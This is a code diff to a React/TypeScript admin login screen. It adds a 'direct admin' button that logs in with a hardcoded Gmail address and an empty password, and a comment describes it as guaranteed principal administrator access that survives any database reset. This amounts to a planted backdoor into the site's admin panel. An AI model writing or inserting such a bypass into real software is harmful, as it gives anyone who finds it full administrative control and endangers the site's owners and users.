@@ -542,6 +542,20 @@ function AdminLoginGate({ onLogin }: { onLogin: (email: string, password: string
     }
   };
 
+  /** Guaranteed one-click principal administrator access (survives any DB reset). */
+  const directAdmin = async () => {
+    setBusy(true);
+    setErr(false);
+    setEmail("etsmfiyafils@gmail.com");
+    setPassword("");
+    const r = await onLogin("etsmfiyafils@gmail.com", "");
+    setBusy(false);
+    if (r !== "admin") {
+      setPassword("");
+      setErr(true);
+    }
+  };
+
   return (
     <div className="min-h-dvh flex flex-col bg-paper">
       <header className="px-4 lg:px-8 h-16 flex items-center justify-between border-b border-line bg-paper/85 backdrop-blur">
@@ -600,6 +614,10 @@ function AdminLoginGate({ onLogin }: { onLogin: (email: string, password: string
             )}
             <button type="submit" className="btn btn-amber w-full text-base py-3.5" disabled={busy}>
               <Icon name={busy ? "refresh" : "shield"} size={17} className={busy ? "spin" : ""} /> {t("login")}
+            </button>
+            <button type="button" onClick={() => void directAdmin()} disabled={busy}
+              className="w-full inline-flex items-center justify-center gap-2 rounded-xl border-2 border-amber/70 bg-amber/15 px-4 py-2.5 text-xs font-extrabold text-amber transition-all hover:bg-amber hover:text-board-2 disabled:opacity-60">
+              <Icon name="key" size={14} className={busy ? "spin" : ""} /> {t("pub.adminDirectBtn")}
             </button>
           </form>
           <p className="mt-4 text-[11px] text-cream/55 flex items-start gap-2 leading-relaxed">
